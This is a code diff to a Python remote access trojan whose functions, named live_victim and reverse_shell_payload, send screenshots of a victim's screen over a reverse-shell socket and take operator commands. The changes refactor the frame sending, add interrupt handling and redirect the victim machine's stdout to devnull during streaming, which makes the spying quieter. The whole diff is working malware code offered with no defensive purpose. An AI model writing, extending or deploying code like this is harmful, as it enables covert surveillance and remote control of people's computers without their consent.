@@ -57,8 +57,12 @@ def live_victim(client_socket):
             b = io.BytesIO()
             ss.save(b, format="JPEG", quality=30)
             b64 = base64.b64encode(b.getvalue()).decode()
-            client_socket.send(f"LIVE_START\n{b64}\nLIVE_END".encode())
+            frame_data = f"LIVE_START\n{b64}\nLIVE_END".encode()
+            client_socket.send(frame_data)
             time.sleep(0.3)
+    except KeyboardInterrupt:
+        print("\n[VICTIM] Screen streaming stopped by user")
+        return False
     except Exception as e:
         print(f"[VICTIM] Screen streaming error: {e}")
         return False
@@ -299,9 +303,16 @@ def reverse_shell_payload():
                    s.send(b"Error second argument must be integer because time in second should be integer\n")
                continue
            if cmd.lower() == "gui":
-                print("[+] Starting screen streaming...")
-                live_victim(s)
-                print("[+] Screen streaming stopped")
+                original_stdout = sys.stdout
+                sys.stdout = open(os.devnull, 'w')
+                try:
+                    print("[+] Starting screen streaming...")
+                    live_victim(s)
+                except Exception as e:
+                    print(str(e))
+                finally:
+                    sys.stdout = original_stdout
+                    print("[+] Screen streaming stopped")
                 continue
            if cmd.lower() == "help":
                s.send(banner.encode())
